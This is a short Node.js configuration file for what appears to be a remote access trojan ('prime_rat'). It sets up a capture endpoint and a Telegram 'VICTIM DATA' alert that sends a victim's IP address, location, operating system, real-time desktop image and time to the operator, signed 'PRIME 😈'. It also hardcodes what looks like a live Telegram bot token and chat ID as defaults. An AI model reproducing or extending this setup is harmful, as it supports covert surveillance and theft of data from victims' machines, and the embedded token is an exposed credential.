module.exports = {
  // TELEGRAM CONFIG
  BOT_TOKEN: process.env.BOT_TOKEN || '7972346190:AAGgZqyiXZiadOFaKxilcerba0Wk87dvL5Q', // Dapat dari @BotFather
  CHAT_ID: process.env.CHAT_ID || '8388649100', // Chat ID pribadi
  
  // SERVER CONFIG
  PORT: process.env.PORT || 3000,
  
  // SECURITY
  SECRET_KEY: process.env.SECRET_KEY || 'prime_rat_secure_key_2025',
  
  // API ROUTES
  CAPTURE_ENDPOINT: '/api/v1/capture',
  WEBHOOK_ENDPOINT: '/webhook',
  
  // MESSAGES
  VICTIM_ALERT: `‼️VICTIM DATA ‼️\n📍IP : {IP}\n🌍 Location : {LOCATION}\n🖥️ OS : {OS}\n📷 FOTO : Real-time Desktop\n🕐 Time : {TIME}\nSupport by : PRIME 😈`,
  
  // LOGGING
  LOG_LEVEL: 'debug'
};